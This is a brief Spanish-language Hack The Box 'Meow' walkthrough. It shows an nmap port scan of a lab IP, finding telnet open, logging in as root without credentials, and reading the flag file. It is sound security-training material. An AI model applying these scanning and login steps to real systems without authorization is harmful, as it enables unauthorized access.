# 🐱 HTB - Meow

**IP:** 10.129.20.240  
**Dificultad:** Muy fácil  
**Categoría:** Starting Point  
**Autor:** miguelt86

---

## 🔎 Escaneo Nmap

```bash
nmap -sS -Pn -p- -T4 10.129.20.240

## Resultado

23/tcp open  telnet

💻 Explotación
Acceso sin credenciales por Telnet:

telnet 10.129.20.240

Conexión directa como root.

📂 Verificando flag:

ls
cat flag.txt

✔️ Bandera capturada correctamente.

📡 Herramientas utilizadas
nmap

telnet

openvpn

Script propio: htbcheck.sh

🏁 Resultado
✅ Bandera capturada
🎖️ Ver logro en HTB

✍️ Autor
GitHub: @Migueltejada86
HTB Profile: miguelt86

